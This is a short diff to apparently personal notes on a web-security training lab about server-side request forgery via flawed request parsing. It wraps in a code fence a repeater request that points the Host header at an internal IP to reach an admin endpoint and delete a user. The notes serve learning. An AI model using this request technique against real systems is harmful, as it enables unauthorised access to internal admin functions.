@@ -106,7 +106,7 @@ my:
 <img width="916" height="602" alt="image" src="https://github.com/user-attachments/assets/f8571322-e1c6-4a39-86e7-398fe8e73fd7" />
 <img width="874" height="519" alt="image" src="https://github.com/user-attachments/assets/2a73df06-0bad-47fc-97c7-bbb83e8124d6" />
 
-
+```
 Lab: SSRF via flawed request parsing
 
 repeater:
@@ -133,3 +133,4 @@ Host: 192.168.0.108
 repeater:
 GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net/admin/delete?username=carlos&csrf=qXDiAKVM0rehNKUVcFCxbf6npsAFtMmR
 Host: 192.168.0.108
+```
